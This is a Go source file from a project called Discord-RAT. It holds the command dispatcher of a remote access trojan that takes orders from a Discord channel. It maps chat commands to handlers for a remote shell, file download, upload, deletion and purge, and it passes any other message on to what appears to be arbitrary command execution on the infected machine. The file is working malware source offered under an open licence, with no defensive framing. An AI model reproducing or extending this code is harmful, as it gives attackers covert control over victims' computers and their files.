/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package bot

import (
	"strings"

	"github.com/bwmarrin/discordgo"

	"github.com/codeuk/discord-rat/cmd/bot/commands"
)

// Command represents the attributes of a Bot command that can be handled appropriately.
type Command struct {
	Name   string
	OnCall func(*commands.BotMessage)
}

// The list of valid commands to be listened for and handled.
var CommandList = []Command{
	{
		Name:   "purge",
		OnCall: commands.HandlePurge,
	}, {
		Name:   "cd",
		OnCall: commands.HandleDirectoryChange,
	}, {
		Name:   "shell",
		OnCall: commands.HandleShellConnection,
	}, {
		Name:   "download",
		OnCall: commands.HandleFileDownload,
	}, {
		Name:   "upload",
		OnCall: commands.HandleFileUpload,
	}, {
		Name:   "delete",
		OnCall: commands.HandleFileDelete,
	},
}

// CommandHandler defines and handles custom commands for the Discord Bot and system.
func (discordBot *DiscordSession) CommandHandler(dg *discordgo.Session, message *discordgo.MessageCreate) {
	// Handle the commands sent from any accounts other than the bot.
	if !message.Author.Bot {
		// Validate the agents command channel.
		if message.ChannelID == discordBot.ChannelID.ID {
			// Message to use for handling commands.
			botMessage := &commands.BotMessage{
				Session: discordBot.Session,
				Message: message,
			}

			// Handle static agent commands.
			switch message.Content {
			case "kill":
				discordBot.CloseSessionGracefully()
				return
			case "menu":
				discordBot.SendCommandMenu()
				return
			case "help":
				discordBot.SendHelpMenu()
				return
			case "ping":
				commands.HandlePing(botMessage)
				return
			}

			// Iterate through the predefined command list.
			for _, command := range CommandList {
				// Check if the latest message of the user matches the current command.
				if strings.HasPrefix(message.Content, command.Name) {
					// Call the command with the required information.
					command.OnCall(botMessage)
					return
				}
			}

			// Default command execution.
			commands.HandleCommandExecution(botMessage)
		}
	}
}
